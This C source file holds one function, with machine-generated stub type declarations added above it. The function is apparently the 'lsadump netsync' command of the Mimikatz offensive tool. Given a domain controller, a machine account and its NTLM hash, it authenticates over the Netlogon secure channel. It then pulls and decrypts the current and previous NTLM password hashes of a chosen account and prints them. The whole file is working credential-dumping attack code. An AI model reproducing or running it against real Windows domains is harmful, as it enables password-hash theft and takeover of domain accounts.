#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_12__   TYPE_2__ ;
typedef  struct TYPE_11__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  wchar_t ;
typedef  int /*<<< orphan*/  sessionKey ;
typedef  int /*<<< orphan*/  ntlmHash ;
typedef  int /*<<< orphan*/  i ;
struct TYPE_12__ {int /*<<< orphan*/  digest; } ;
struct TYPE_11__ {char member_0; char member_1; char member_2; char member_3; char member_4; char member_5; char member_6; char member_7; size_t* data; } ;
typedef  int* PDWORD64 ;
typedef  int /*<<< orphan*/ * PCWCHAR ;
typedef  int /*<<< orphan*/  PBYTE ;
typedef  int /*<<< orphan*/  NT_OWF_PASSWORD ;
typedef  scalar_t__ NTSTATUS ;
typedef  TYPE_1__ NETLOGON_CREDENTIAL ;
typedef  int /*<<< orphan*/  NETLOGON_AUTHENTICATOR ;
typedef  TYPE_2__ MD5_CTX ;
typedef  int /*<<< orphan*/  LPCBYTE ;
typedef  int /*<<< orphan*/  LPBYTE ;
typedef  int /*<<< orphan*/  LOGONSRV_HANDLE ;
typedef  int /*<<< orphan*/  ENCRYPTED_NT_OWF_PASSWORD ;
typedef  size_t DWORD ;
typedef  int /*<<< orphan*/  BYTE ;

/* Variables and functions */
 size_t ARRAYSIZE (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  CALG_MD5 ; 
 scalar_t__ I_NetServerAuthenticate2 (int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ *,TYPE_1__*,TYPE_1__*,size_t*) ; 
 scalar_t__ I_NetServerReqChallenge (int /*<<< orphan*/ ,int /*<<< orphan*/ *,TYPE_1__*,TYPE_1__*) ; 
 scalar_t__ I_NetServerTrustPasswordsGet (int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 int LM_NTLM_HASH_LENGTH ; 
 int /*<<< orphan*/  MD5Final (TYPE_2__*) ; 
 int /*<<< orphan*/  MD5Init (TYPE_2__*) ; 
 int /*<<< orphan*/  MD5Update (TYPE_2__*,size_t*,int) ; 
 int MD5_DIGEST_LENGTH ; 
 int /*<<< orphan*/ * MIMIKATZ ; 
 scalar_t__ NT_SUCCESS (scalar_t__) ; 
 int /*<<< orphan*/  PRINT_ERROR (char*,...) ; 
 int /*<<< orphan*/  RtlDecryptDES2blocks2keys (int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 
 scalar_t__ RtlEqualMemory (size_t*,size_t*,int) ; 
 scalar_t__ STATUS_NO_SUCH_USER ; 
 scalar_t__ STATUS_SUCCESS ; 
 int /*<<< orphan*/  ServerSecureChannel ; 
 int /*<<< orphan*/  kprintf (char*,...) ; 
 int /*<<< orphan*/  kuhl_m_lsadump_netsync_AddTimeStampForAuthenticator (TYPE_1__*,int,int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  kuhl_m_lsadump_netsync_NlComputeCredentials (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * kuhl_m_lsadump_netsync_sc ; 
 scalar_t__ kull_m_crypto_hmac (int /*<<< orphan*/ ,int /*<<< orphan*/ *,int,int /*<<< orphan*/ ,int,int /*<<< orphan*/ *,int) ; 
 scalar_t__ kull_m_string_args_byName (int,int /*<<< orphan*/ **,char*,int /*<<< orphan*/ **,int /*<<< orphan*/ *) ; 
 scalar_t__ kull_m_string_stringToHex (int /*<<< orphan*/ *,int /*<<< orphan*/ *,int) ; 
 int /*<<< orphan*/  kull_m_string_wprintf_hex (int /*<<< orphan*/ *,int,int /*<<< orphan*/ ) ; 

NTSTATUS kuhl_m_lsadump_netsync(int argc, wchar_t * argv[])
{
	NTSTATUS status;
	NETLOGON_CREDENTIAL ClientChallenge = {'-', '\\', '|', '/', '-', '\\', '|', '/'}, ServerChallenge, CandidateServerCredential, ClientCredential, ServerCredential;
	NETLOGON_AUTHENTICATOR ClientAuthenticator, ServerAuthenticator;
	BYTE ntlmHash[LM_NTLM_HASH_LENGTH], sessionKey[MD5_DIGEST_LENGTH];
	DWORD i = 0, NegotiateFlags = 0x600FFFFF;
	MD5_CTX ctx;
	ENCRYPTED_NT_OWF_PASSWORD EncryptedNewOwfPassword, EncryptedOldOwfPassword;
	NT_OWF_PASSWORD NewOwfPassword, OldOwfPassword;
	PCWCHAR szDc, szComputer, szUser, szNtlm, szAccount;

	if(kull_m_string_args_byName(argc, argv, L"dc", &szDc, NULL))
	{
		if(kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
		{
			kull_m_string_args_byName(argc, argv, L"account", &szAccount, szUser);
			kull_m_string_args_byName(argc, argv, L"computer", &szComputer, MIMIKATZ);
			if(kull_m_string_args_byName(argc, argv, L"ntlm", &szNtlm, NULL))
			{
				if(kull_m_string_stringToHex(szNtlm, ntlmHash, sizeof(ntlmHash)))
				{
					//kprintf(L"> ClientChallenge          : "); kull_m_string_wprintf_hex(ClientChallenge.data, sizeof(ClientChallenge.data), 0); kprintf(L"\n");
					status = I_NetServerReqChallenge((LOGONSRV_HANDLE) szDc, (wchar_t *) szComputer, &ClientChallenge, &ServerChallenge);
					if(NT_SUCCESS(status))
					{
						//kprintf(L"< ServerChallenge          : "); kull_m_string_wprintf_hex(ServerChallenge.data, sizeof(ServerChallenge.data), 0); kprintf(L"\n");
						MD5Init(&ctx);
						MD5Update(&ctx, &i, sizeof(i));
						MD5Update(&ctx, ClientChallenge.data, sizeof(ClientChallenge.data));
						MD5Update(&ctx, ServerChallenge.data, sizeof(ServerChallenge.data));
						MD5Final(&ctx);
						if(kull_m_crypto_hmac(CALG_MD5, ntlmHash, sizeof(ntlmHash), ctx.digest, sizeof(ctx.digest), sessionKey, sizeof(sessionKey)))
						{
							//kprintf(L"> Session Key              : "); kull_m_string_wprintf_hex(sessionKey, sizeof(sessionKey), 0); kprintf(L"\n");
							kuhl_m_lsadump_netsync_NlComputeCredentials((PBYTE) ClientChallenge.data, (PBYTE) ClientCredential.data, sessionKey);
							kuhl_m_lsadump_netsync_NlComputeCredentials((PBYTE) ServerChallenge.data, (PBYTE) CandidateServerCredential.data, sessionKey);
							//kprintf(L"> ClientCredential         : "); kull_m_string_wprintf_hex(ClientCredential.data, sizeof(ClientCredential.data), 0); kprintf(L"\n");
							//kprintf(L"> CandidateServerCredential: "); kull_m_string_wprintf_hex(CandidateServerCredential.data, sizeof(CandidateServerCredential.data), 0); kprintf(L"\n");
							//kprintf(L"> NegotiateFlags           : 0x%08x\n", NegotiateFlags);
							status = I_NetServerAuthenticate2((LOGONSRV_HANDLE) szDc, (wchar_t *) szUser, ServerSecureChannel, (wchar_t *) szComputer, &ClientCredential, &ServerCredential, &NegotiateFlags);
							if(NT_SUCCESS(status))
							{
								//kprintf(L"< ServerCredential         : "); kull_m_string_wprintf_hex(ServerCredential.data, sizeof(ServerCredential.data), 0); kprintf(L"\n");
								if(RtlEqualMemory(CandidateServerCredential.data, ServerCredential.data, sizeof(CandidateServerCredential.data)))
								{
									//kprintf(L"< NegotiateFlags           : 0x%08x\n", NegotiateFlags);
									for(status = STATUS_NO_SUCH_USER, i = 0; (status == STATUS_NO_SUCH_USER) && (i < ARRAYSIZE(kuhl_m_lsadump_netsync_sc)); i++)
									{
										kuhl_m_lsadump_netsync_AddTimeStampForAuthenticator(&ClientCredential, 0x10, &ClientAuthenticator, sessionKey);
										//kprintf(L"> ClientAuthenticator (%u)  : ", kuhl_m_lsadump_netsync_sc[i]); kull_m_string_wprintf_hex(ClientAuthenticator.Credential.data, sizeof(ClientAuthenticator.Credential.data), 0); kprintf(L" (%u - 0x%08x)\n", ClientAuthenticator.Timestamp, ClientAuthenticator.Timestamp);
										status = I_NetServerTrustPasswordsGet((LOGONSRV_HANDLE) szDc, (wchar_t *) szAccount, kuhl_m_lsadump_netsync_sc[i], (wchar_t *) szComputer, &ClientAuthenticator, &ServerAuthenticator, &EncryptedNewOwfPassword, &EncryptedOldOwfPassword);
										if(NT_SUCCESS(status))
										{
											kprintf(L"  Account: %s\n", szAccount);
											RtlDecryptDES2blocks2keys((LPCBYTE) &EncryptedNewOwfPassword, sessionKey, (LPBYTE) &NewOwfPassword);
											RtlDecryptDES2blocks2keys((LPCBYTE) &EncryptedOldOwfPassword, sessionKey, (LPBYTE) &OldOwfPassword);
											kprintf(L"  NTLM   : "); kull_m_string_wprintf_hex(&NewOwfPassword, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
											kprintf(L"  NTLM-1 : "); kull_m_string_wprintf_hex(&OldOwfPassword, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
										}
										*(PDWORD64) ClientCredential.data += 1; // lol :) validate server auth
									}
									if(!NT_SUCCESS(status))
										PRINT_ERROR(L"I_NetServerTrustPasswordsGet (0x%08x)\n", status);
								}
								else PRINT_ERROR(L"ServerCredential does not match CandidateServerCredential\n");
							}
							else PRINT_ERROR(L"I_NetServerAuthenticate2 (0x%08x)\n", status);
						}
					}
					else PRINT_ERROR(L"I_NetServerReqChallenge (0x%08x)\n", status);
				}
				else PRINT_ERROR(L"ntlm hash/rc4 key length must be 32 (16 bytes)\n");
			}
			else PRINT_ERROR(L"Missing argument : ntlm\n");
		}
		else PRINT_ERROR(L"Missing argument : user\n");
	}
	else PRINT_ERROR(L"Missing argument : dc\n");
	return STATUS_SUCCESS;
}